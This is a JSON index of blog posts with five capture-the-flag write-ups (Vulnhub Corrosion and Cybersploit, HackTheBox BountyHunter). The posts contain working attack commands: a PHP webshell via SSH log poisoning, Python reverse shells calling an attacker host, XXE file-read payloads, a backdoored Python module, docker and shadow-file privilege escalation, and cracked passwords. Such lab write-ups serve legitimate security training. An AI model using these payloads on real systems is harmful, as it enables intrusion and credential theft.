[
  
  {
    "title": "Vulnhub - Corrosion-1 | EN",
    "url": "/posts/Vulnhub-Corrosion-1/",
    "categories": "Writeup, Vulnhub, Corrosion",
    "tags": "web, writeup, vulnhub, lfi, zip_cracking, john, ssh_poisoning, previlege_escalation",
    "date": "2023-04-28 10:10:00 +0300",
    





    "snippet": "InformationRoom  Name: Corrosion-1  Profile: Corrosion-1  Difficulty: Easy  Description: A easy box for beginners, but not too easy. Good Luck.Write-upOverviewIt’s a nice room , you can exploit LFI injection , SSH poisoning attack , cracking Zip password with john , basic privilege escalation step .EnumerationNetwork enumerationlet’s start finding ip address of the machine than we will enumeration port and services with Nmap.sudo arp-scan -l -I ens36we find that 192.168.238.7 is our corrision-1 machine , let’s run nmap and get results.Port and service scan with nmap:sudo nmap -sV -T4 -sS -v -Pn -p- 192.168.238.7 -sC -oN nmap  22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 0ca71c8b4e856b168cfdb7cd5f603ea4 (RSA)|   256 0f24f465af50d3d3aa0933c3173d63c7 (ECDSA)|_  256 b0facd7773dae47dc875a1c55f2c210a (ED25519)80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods: |_  Supported Methods: OPTIONS HEAD GET POST|_http-server-header: Apache/2.4.46 (Ubuntu)MAC Address: 08:00:27:8C:25:8D (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelwe can recognize there is two open port , let’s first investigate http server , if we didn’t find anything than we can investigate ssh port too.Web enumerationwe can enumerate directories first , i will run ffuf for that you can run any other tools too.ffuf -w /home/batmanly/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.238.7//FUZZ -c -icThere are no links to some interesting features:                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]tasks                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms]blog-post               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms]                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3ms]:: Progress: [1273820/1273820] :: Job [1/1] :: 11071 req/sec :: Duration: [0:01:01] :: Errors: 0 ::we find two folder after i look tasks folder i find interesting things about SSH , i think this machine has a vulnerability like LFI we will utilize  this vulnerability with SSH log and get shell , let’s continue examine our other path , it’s look still developing this website so let’s run FFUF in this directory.ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.238.7/blog-post/FUZZ -c -recursion -ic -e .txt,.php,.bak,.tar.gz                         [Status: 200, Size: 190, Words: 20, Lines: 12, Duration: 2ms].php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1ms]archives                [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 0ms][INFO] Adding a new job to the queue: http://192.168.238.7/blog-post/archives/FUZZuploads                 [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 0ms][INFO] Adding a new job to the queue: http://192.168.238.7/blog-post/uploads/FUZZafter looking up archives folder i found there is a php file randylogs.php	  it might keep ssh logs , so let’s try to inject ssh connection php code and use this vulnerability execute command. let’s try to find some parameters for this php files .Parameter Fuzzingffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.238.7/blog-post/archives/randylogs.php?FUZZ=/etc/passwd -fwe found that LFI vulnerability is on the file parameters , let’s use this and ssh auth log poising and get shell.file                    [Status: 200, Size: 2832, Words: 38, Lines: 49, Duration: 1ms]:: Progress: [4614/4614] :: Job [1/1] :: 52 req/sec :: Duration: [0:00:04] :: Errors: Web exploitationFirst we will poisining ssh auth with php code , than we can use this to get shell or execute commandssh &#39;&amp;lt;?php system($_GET[&quot;cmd&quot;]);?&amp;gt;&#39;@192.168.238.7after that we can use LFI to RCE vulnerablity to execute command.curl http://192.168.238.7/blog-post/archives/randylogs.php?file=/var/log/auth.log\\&amp;amp;cmd=whoamiafter tried bash and sh reverse shell i couldn’t be successful , so i tried python reverse shell . that time i got a reverse shell from machine.Reverse ShellAfter finding and executing vulnerability , let’s get reverse shell and try to escalate our privileges.nc -nlvp 4242we can use python reverse shell.python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.238.6&quot;,4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)&#39;http://192.168.238.9/blog-post/archives/randylogs.php?file=/var/log/auth.log&amp;amp;cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.238.6%22,4242));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27now we can try to escalate root.Privilege Escalationwe can enumerate simple Linux command or we can use directly Linpeas to know the weakness of the machine.wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/builder/linpeas_base.shRun Local HTTP Serverupdog -p 8080 # Download linpeas_base.sh to Crossion-1 machinewget http://192.168.238.6:8080/linpeas_base.shchmod +x linpeas_base.sh./linpeas_base.shafter search some location i found a /var/backups inside that directory there is a user_backup.zip ,so let’s get it our machine , and crack this zip with john.nc 192.168.238.6 4343 &amp;lt; user_backup.zipnc -lnvp 4343 &amp;gt; user.zipCracking Zip With JohnFor cracking zip with john first we must get hash of zip and give it john with wordlist .zip2john user.zip &amp;gt; hash#crackingjohn hash --wordlist=~/rockyou.txtafter finding zip password we can extract zip  and see what’s inside that.let’s try to connect server with ssh key and password. with password we could access corrison-1 server,ssh randy@192.168.238.9Elevation of Privilege : User to Rootafter look around we can there’s a file called easysysinfo.c we can examine this and see what we can do with that. this file used by randy inside ~/tools/easyinfo it has suid bit of root. so we can try to utilize this to get root shell.we can run easyinfo without sudo password .if we can run this file as sudo let’s try to overwrite this file with bash and run that to get shell.Yep. Now we Got root. Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me."
  },
  
  {
    "title": "Vulnhub - Corrosion-2 | EN",
    "url": "/posts/Vulnhub-Corrosion-2/",
    "categories": "Writeup, Vulnhub, Corrosion",
    "tags": "web, writeup, vulnhub, zip_cracking, john, previlege_escalation, python_reverse_shell, tomcat, war_shell",
    "date": "2023-04-16 10:10:00 +0300",
    





    "snippet": "InformationRoom  Name: Corrosion-2  Profile: Corrosion-2  Difficulty: Medium  Description: Hint: Enumeration is key.Write-upOverviewIt was enjoyable room , i liked the way to use python module and escalate privileges . it’s also show how it’s important keep backup file save , if someone get this backups he can utilize and hack our system .Enumerationafter import machine VirtualBox , we can use arp-scan to find ip address of machine .sudo arp-scan -l -I ens36after finding ip we can start scan network .Network EnumerationNmap Scanningi commonly use Nmap for network scanning, so let’s run Nmap and examine that results.sudo nmap -sV -T4 -sS -v -Pn -p- 192.168.238.10 -sC -oN nmapResults:PORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 6ad8446080397ef02d082fe58363f070 (RSA)|   256 f2a662d7e76a94be7b6ba512692efed7 (ECDSA)|_  256 28e10d048019be44a64873aae86a6544 (ED25519)80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))| http-methods: |_  Supported Methods: OPTIONS HEAD GET POST|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.41 (Ubuntu)8080/tcp open  http    Apache Tomcat 9.0.53|_http-favicon: Apache Tomcat| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-title: Apache Tomcat/9.0.53|_http-open-proxy: Proxy might be redirecting requestsMAC Address: 08:00:27:D8:3B:AB (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelit’s look there is three port is open , we can start looking at tomcat version vulnerability. i didn’t any tomcat vulnerability , let’s look web server at port 80.Web EnumerationNuclei over TomcatAfter i run Nuclei over tomcat , i found interesting zip as named backup.zip, i downloaded it has password security let’s crack this password with john.nuclei -u http://192.168.238.10:8080/http-missing-security-headers:access-control-allow-headers] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:access-control-allow-credentials] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:access-control-max-age] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:access-control-allow-methods] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:access-control-expose-headers] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.238.10:8080/[http-missing-security-headers:access-control-allow-origin] [http] [info] http://192.168.238.10:8080/[public-tomcat-manager] [http] [info] http://192.168.238.10:8080/manager/html[pgsql-detect] [tcp] [info] 192.168.238.10:8080[samba-detect] [tcp] [info] 192.168.238.10:8080[tomcat-scripts] [http] [info] http://192.168.238.10:8080/examples/jsp/index.html[tomcat-scripts] [http] [info] http://192.168.238.10:8080/examples/websocket/index.xhtml[tomcat-scripts] [http] [info] http://192.168.238.10:8080/examples/servlets/servlet/SessionExample[tomcat-exposed-docs] [http] [info] http://192.168.238.10:8080/docs/ [Version 9.0.53,][favicon-detect:apache-tomcat] [http] [info] http://192.168.238.10:8080/favicon.ico[waf-detect:ats] [http] [info] http://192.168.238.10:8080/[waf-detect:apachegeneric] [http] [info] http://192.168.238.10:8080/[ibm-d2b-database-server] [tcp] [info] 192.168.238.10:8080[tomcat-detect] [http] [info] http://192.168.238.10:8080/ [9.0.53][options-method] [http] [info] http://192.168.238.10:8080/ [GET, HEAD, POST, OPTIONS][tomcat-manager-pathnormalization] [http] [info] http://192.168.238.10:8080/2P0JOo9F8EOdkieMXq6E1ltk7Wf/..;/manager/html[zip-backup-files] [http] [medium] http://192.168.238.10:8080/backup.zip [FILENAME=&quot;backup&quot;,EXT=&quot;zip&quot;][openssh-detect] [tcp] [info] 192.168.238.10:22 [SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3]http://192.168.238.10:8080/backup.zipCracking Zip password with JohnFirst we must get hash of zip than we can give this hash to john for crack.zip2john backup.zip &amp;gt; hashCracking hashjohn hash --wordlist=~/rockyou.txtafter find password let’s extract zip and examine what’s inside this zip.tomcat store user credentials inside tomcat-users.xml file let’s get inside this file and find password for any admin user. Than we can upload war payload to get reverse shell over the corrision-2 machine.Web exploitationwe can try this username and password if we can access tomcat server.with admin credentials we can access tomcat server let’s create war payload and upload this , than run and get reverse shell.Get reverse Shell over Tomcatwe can create war payload with MSFvenom and upload this payload to tomcat , or we can directly use Metasploit for do all this job for us.i will do with Metasploit you can do another way too.use exploit/multi/http/tomcat_mgr_uploadmsf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set rhost 192.168.238.10msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set rport 8080msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set httpusername &amp;lt;username&amp;gt;msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set httppassword &amp;lt;password&amp;gt;msf exploit(multi/http/tomcat_mgr_upload) &amp;gt; set FingerprintCheck falsemsf exploit(multi/http/tomcat_mgr_upload) &amp;gt; exploitnow we have a shell , we can move next step to get root shell.Privilege Escalationafter get shell we can upload Linpeas and try to find a way escalate privileges.Elevation of Privilege : tomcat to jaye# On main machinupdog -p 8081 # Downlaod temp folder on corrision-2 machinewget http://192.168.238.6:8081/linpeas_base.shchmod +x linpeas_base.sh./linpeas_base.shwe found interesting file on the root directorylet’s investigate after read this i tried old tomcat password for randy but it didn’t successful i look other user and for Jaye user i become successful. let’s move on and try to escalate another suerElevation of Privilege : jaye to Rootwe can run again linpeas at this user. let’s see what we will get.wget http://192.168.238.6:8081/linpeas_base.shchmod +x linpeas_base.sh./linpeas_base.sh/home/                                                                                                                                                                                                             /home/randy/note.txt                                                                                                                                                                                               /home/randy/.bash_history                                                                                                                                                                                          /home/randy/randombase64.py                                                                                                                                                                                        /home/jaye/.bash_history                                                                                                                                                                                           /home/jaye/Files                                                                                                                                                                                                   /home/jaye/Files/look                                                                                                                                                                                              /root/                                                                                                                                                                                                             /var/www                                                                                                                                                                                                           /var/www/html                                                                                                                                                                                                      /var/www/html/index.html       look’s we can write base64.py , we can see root can run randombase64.py , so let’s get shell from there./usr/lib/python3.8/base64.py                                                                                                                                                                                       we will change base64.py file and write reverse shell inside that , after run randombase64.py we will get root shellimport socketimport subprocessimport os:s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.238.6&quot;,4542))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])Reverse shell with Python Moduleopen filevi /usr/lib/python3.8/base64.pythan write the code upper inside this file and exit with :wq .after run this we get shell but still we are not root, let’s leave this here and start looking around more , we must find a way to run python with sudo without password than we can get root shell.Elevation of Privilege : jaye to Randyinside /home/jaye/Files we find tool named look it has suid bit so let’s try to use this tool and get password inside /etc/shadow  file ../look &#39;&#39; /etc/shadowwe can dump password with this , i think it will hard to crack root password so i will try to crack randy password than use randombase64.py if it has previleges to run as root , let’s move on and see.Cracking User password with Johnwe must first copy hash to any file than use john with wordlist to crack this hash.randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:copy randy hash inside any file.john hash --wordlist=~/rockyou.txtafter cracking hash we can this time login as randy and use randombase64.py file if we can , let’s check sudoers file and see our permission .it’s look we can run this file as sudo , we already add our shell inside this file , so let’s run with sudo and get shell.Elevation of Privilege : randy to rootlet’s start listener and run randombase64.py file with sudo .nc -nlvp 4542sudo /usr/bin/python3.8 /home/randy/randombase64.pyYep. Now we Got root. Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me."
  },
  
  {
    "title": "Vulnhub - Cybersploit-1 | EN",
    "url": "/posts/Vulnhub-Cybersploit-1/",
    "categories": "Writeup, Vulnhub, Cybersploit",
    "tags": "web, writeup, encoding, base64, cybersploit-1, overlays, exploitdb",
    "date": "2023-03-25 10:10:00 +0300",
    





    "snippet": "InformationROOM  Name: Cybersploit-1  Profile: Cybersploit-1  Difficulty: Easy  Description: THIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM. FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER &amp;amp; EXPLOIT-DB.Write-upOverviewIt’s a easy machine you can learn encoding/decoding and user exploit db exploits.Network enumerationlet’s start finding ip address of the machine than we will enumeration port and services with Nmap.sudo arp-scan -l -I vboxnet0Port and service scan with Nmap:after finding ip of our cybersploit-1 machine we can now start scanning network.sudo nmap -sV -T4 -sS -v -Pn -p- 192.168.56.102 -sC -oN nmap3 we found there is 2 port is open , let’s enumerate web services and if there is a weakness we will exploit this vulnerabilities.22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 011bc8fe18712860846a9f303511663d (DSA)|   2048 d95314a37f9951403f49efef7f8b35de (RSA)|_  256 ef435bd0c0ebee3e76615c6dce15fe7e (ECDSA)80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))|_http-title: Hello Pentester!| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.2.22 (Ubuntu)MAC Address: 08:00:27:86:68:85 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelWeb enumerationlet’s look website . when i looked website first page in the view-source i found a username , let’s keep it for further usage.view-source:http://192.168.56.102/after looking up  robots.txt i found a some kind of base64 encoded string , let’s decode this.echo -e &#39;R29vZCBXb3JrICEKRmxhZzE6IGN5YmVyc3Bsb2l0e3lvdXR1YmUuY29tL2MvY3liZXJzcGxvaXR9&#39; | base64 -dsimple flag nothing interesting , i will scan directories with FFUF.Good Work !Flag1: cybersploit{youtube.com/c/cybersploit} I like use ffuf for finding any directories , let’s scan for directories and files , or backups.ffuf -w /home/batmanly/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.56.102/FUZZ -c -ic -e .txt,.php,.bak,.tar.gz[Status: 200, Size: 2333, Words: 318, Lines: 51, Duration: 5ms]    * FUZZ: index[Status: 200, Size: 2333, Words: 318, Lines: 51, Duration: 6ms]    * FUZZ: [Status: 200, Size: 79, Words: 2, Lines: 3, Duration: 0ms]    * FUZZ: robots.txt[Status: 200, Size: 79, Words: 2, Lines: 3, Duration: 9ms]    * FUZZ: robots[Status: 200, Size: 3757743, Words: 22955, Lines: 21776, Duration: 1ms]    * FUZZ: hacker[Status: 200, Size: 2333, Words: 318, Lines: 51, Duration: 1ms]    * FUZZ: [Status: 403, Size: 295, Words: 21, Lines: 11, Duration: 12ms]    * FUZZ: server-statusSSH Login with founded username-passwordafter finding nothing with directory scanning , i wanted to try the flag we found and username we found in the website with ssh login and i successfully login with that credentials.Privilege EscalationNow it’s time to escalate our privileges and get root shell .it’s good to look for home directory when you get access any machine, because of that i started investigation home directory i found flag2.txt , it’s also encoded numbers , i will decode and see what’s interesting there.cat flag2.txtafter decoding encoded string we found second flag , i guess it’s also a password of any account , let’s see.i tried the flag i found with root and cybersploit user , but i couldn’t get access other user , let’s search more.cybersploit{https:t.me/cybersploit1}i will upload Linpeas and use it too find a way to escalate privileges.updog -p 8000wget http://192.168.56.1:8000/linpeas.shchmod +x linpeas.sh./linpeas.shafter running linpeas we found overlays exploit , this machine is vulnerable to this vulnerability Exploiting overlays vulnerabilitywe can download exploit from here and move it to machine , then compile exploit and run. let’s do it.https://www.exploit-db.com/exploits/37292i copy and paste the content of the exploit inside x3.c file and compile it as a exploit writer suggest and run. than we got root.compile exploitgcc  x3.c -o ofs./ofsYep. Now we Got root. Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me."
  },
  
  {
    "title": "Vulnhub - Cybersploit-2 | EN",
    "url": "/posts/Vulnhub-Cybersploit-2/",
    "categories": "Writeup, Vulnhub, Cybersploit",
    "tags": "web, writeup, rot-47, docker, previlege_escalation, cybersploit-2",
    "date": "2023-03-15 10:10:00 +0300",
    





    "snippet": "Information  Name: Cybersploit-2  Profile: Cybersploit-2  Difficulty: Easy  Description: THIS IS A MACHINE FOR COMPLETE BEGINNER , THERE ARE THREE FALGS AVAILABLE IN THIS VM. FROM THIS VMs YOU WILL LEARN ABOUT ENCODER-DECODER &amp;amp; EXPLOIT-DB.Write-upOverviewIt’s a nice room , you can learn encoding/decoding and privilege escalation with docker.Network enumerationlet’s start finding ip address of the machine than we will enumeration port and services with Nmap.sudo arp-scan -l -I vboxnet0Port and service scan with Nmap:after finding ip of our cybersploit-2 machine we can now start scanning network.sudo nmap -sV -T4 -sS -v -Pn -p- 192.168.56.103 -sC -oN nmap3 we found there is 2 port is open , let’s enumerate web services and if there is a weakness we will exploit this vulnerabilities.22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: |   3072 ad6d15e744e97bb85909195cbdd66b10 (RSA)|   256 d6d5b45d8df95e6f3a31ad8180349b12 (ECDSA)|_  256 69794f8c90e9436c17f731e8ff870531 (ED25519)80/tcp open  http    Apache httpd 2.4.37 ((centos))| http-methods: |   Supported Methods: POST OPTIONS HEAD GET TRACE|_  Potentially risky methods: TRACE|_http-title: CyberSploit2|_http-server-header: Apache/2.4.37 (centos)MAC Address: 08:00:27:2B:42:7D (Oracle VirtualBox virtual NIC)Web enumerationlet’s look website. after i started searching website inside view-source i found hint rot-47 so after that i started looking something similar rot-47 encoding .view-source:http://192.168.56.103/on the page there is table username and password , we could also try to brute force with this username and passwords but realize there is something rot 47 encoding , so i try to decode this string with rot-47 decoder website.after copy and paste the username and password i found on the web page i get a decoded username and password for login with ssh.D92:=6?5C24J36CDA=@:E`shailendra     cybersploit1Login with sshi successfully reach the shell with founded credentials. there is also hint about docker so let’s investigate docker privilege escalation steps.Privilege EscalationElevation of Privilege : User to Root with dockerafter finding hint i started looking around and i found that user is in docker group so we can use docker group and get shell as a root.because we don’t have internet access on cybersploit-2 i will download alpine image on my local and save it , then upload it and load on cybersploit-2 machine , than try to get shell .let’s give a try.Download alpine and upload server for privilege escalationwe can download alpine by this command the latest versiondocker pull alpinelet’s save alpine image .sudo docker save -o alpine.docker alpinenow let’s upload this image our cybersploit-2 machine than load.updog -p 8000curl -O http://192.168.56.1:8000/alpine.dockerload image inside dockerdocker load -i alpine.dockeri tried this way but i got error ,so i connected machine to internet for access docker.io and dowlonad alpine image for us , then we can get shell over the docker .Change host adapter to Nat adapterjust go settings and add  another adapter .after that we can get shell with docker.docker run -v /:/mnt --rm -it alpine chroot /mnt shYep. Now we Got root. Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me."
  },
  
  {
    "title": "HackTheBox - BountyHunter | EN",
    "url": "/posts/HackTheBox-BountyHunter/",
    "categories": "Writeup, HackTheBox",
    "tags": "web, xxe, php_filter, hackthebox, writeup",
    "date": "2022-05-31 09:10:00 +0300",
    





    "snippet": "InformationRoom  Name: BountyHunter  Profile: BountyHunter  Difficulty: EasyOverviewIt’s a nice room , you can exploit xxe injection , php wrapper to read data, and get root access with exploiting python code and understand it’s algorithm.Write-upLet’s start enumeration and see what we can gather.Network enumerationPort and service scan with nmap:nmap -sV -T4 -sS -v -Pn -p- 10.129.98.250 -sC -oN htb/BountyHunter/nmapOutput:# Nmap 7.92 scan initiated Tue May 31 08:27:47 2022 as: nmap -sV -T4 -sS -v -Pn -p- -sC -oN htb/BountyHunter/nmap 10.129.98.250Nmap scan report for 10.129.98.250 (10.129.98.250)Host is up (0.086s latency).Not shown: 65533 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-title: Bounty Hunters|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA| http-methods: |_  Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue May 31 08:28:53 2022 -- 1 IP address (1 host up) scanned in 66.19 secondsit’s look we just have ssh and HTTP open with different port , let’s go and enumerate HTTP port.Web enumerationDiscovering directories and files with go buster.gobuster dir -u http://10.129.98.250:80/ -w $BIG -t 50Let’s enumerate files and folders then:===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.129.98.250:80/[+] Method:                  GET[+] Threads:                 50[+] Wordlist:                /home/batmanly/SecLists/Discovery/Web-Content/big.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Timeout:                 10s===============================================================2022/05/31 08:30:34 Starting gobuster in directory enumeration mode===============================================================/.htaccess            (Status: 403) [Size: 278]/.htpasswd            (Status: 403) [Size: 278]/assets               (Status: 301) [Size: 315] [--&amp;gt; http://10.129.98.250/assets/]/css                  (Status: 301) [Size: 312] [--&amp;gt; http://10.129.98.250/css/]   /js                   (Status: 301) [Size: 311] [--&amp;gt; http://10.129.98.250/js/]    /resources            (Status: 301) [Size: 318] [--&amp;gt; http://10.129.98.250/resources/]after investigation webpage we found web portal , that’s still in the development let’s go to there and look what we can find.# portal http://10.129.98.250/portal.phpwe found there is a log submit system , let’s try to inject some data and see what we will get as a response.we found there is a data in the post request , after look the with decoder it’s look xml to base64 data let’s try to xxe payload if it’s work .&amp;lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;		&amp;lt;bugreport&amp;gt;		&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;		&amp;lt;cwe&amp;gt;asfsdaf&amp;lt;/cwe&amp;gt;		&amp;lt;cvss&amp;gt;sdafdsa&amp;lt;/cvss&amp;gt;		&amp;lt;reward&amp;gt;222&amp;lt;/reward&amp;gt;		&amp;lt;/bugreport&amp;gt;let’s use this xxe payload and send it to server , see the response.after sending xxe payload to server we can read data from server , so let’s move on and read more files.after some try i tried again content discovery with gobuster .gobuster dir -u http://10.129.98.250:80/ -w $BIG -t 50 -x phpOutput:===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.129.98.250:80/[+] Method:                  GET[+] Threads:                 50[+] Wordlist:                /home/batmanly/SecLists/Discovery/Web-Content/big.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.1.0[+] Extensions:              php[+] Timeout:                 10s===============================================================2022/05/31 08:48:25 Starting gobuster in directory enumeration mode===============================================================/.htaccess            (Status: 403) [Size: 278]/.htaccess.php        (Status: 403) [Size: 278]/.htpasswd.php        (Status: 403) [Size: 278]/.htpasswd            (Status: 403) [Size: 278]/assets               (Status: 301) [Size: 315] [--&amp;gt; http://10.129.98.250/assets/]/css                  (Status: 301) [Size: 312] [--&amp;gt; http://10.129.98.250/css/]   /db.php               (Status: 200) [Size: 0]                                     /index.php            (Status: 200) [Size: 25169]                                 /js                   (Status: 301) [Size: 311] [--&amp;gt; http://10.129.98.250/js/]    /portal.php           (Status: 200) [Size: 125]                                   /resources            (Status: 301) [Size: 318] [--&amp;gt; http://10.129.98.250/resources/]/server-status        (Status: 403) [Size: 278]                                      let’s read db.php with xxe vulnerability.Web exploitationwe will use this xxe payload to read db.php with PHP filter wrapper. than we will decode it.&amp;lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=db.php&quot;&amp;gt; ]&amp;gt;		&amp;lt;bugreport&amp;gt;		&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;		&amp;lt;cwe&amp;gt;asfsdaf&amp;lt;/cwe&amp;gt;		&amp;lt;cvss&amp;gt;sdafdsa&amp;lt;/cvss&amp;gt;		&amp;lt;reward&amp;gt;222&amp;lt;/reward&amp;gt;		&amp;lt;/bugreport&amp;gt;└─▪echo &#39;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=&#39; | base64 -d                                                                                                        &amp;lt;?php// TODO -&amp;gt; Implement login system with the database.$dbserver = &quot;localhost&quot;;$dbname = &quot;bounty&quot;;$dbusername = &quot;admin&quot;;$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser = &quot;test&quot;;?&amp;gt;now we have credentials let’s try to access server with use we find /etc/passwd file and password we found from db.php file.ssh development@10.129.98.250 pass :m19RoAU0hP41A1sTsq6KPrivilege Escalationlet’s upload linpeas and look if we can get any privilege escalation point to root or other user.# Run Python Serverpython3 -m http.server 80# Get Linpeas wget http://10.8.199.191/linpeas.sh# Run Linpeaschmod +x linpeas.sh./linpeas.shwe found that we can run this file without root password. so let’s go and exploit this vulnerability.after read algorithm of the file i create this payload to get root shell.exploit.md# Skytrain Inc   ## Ticket to root  __Ticket Code:__  **11+100==111 and exec(&quot;import pty; pty.spawn(\\&quot;/bin/sh\\&quot;)&quot;)let’s run this file and get root shell.development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.pyPlease enter the path to the ticket file./home/development/exploit.mdDestination: root# iduid=0(root) gid=0(root) groups=0(root)# cat /root/root.txtc4920fb496c6b325d2ff3c5a692f568bYep. Now we Got root.Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me."
  },
  
  {
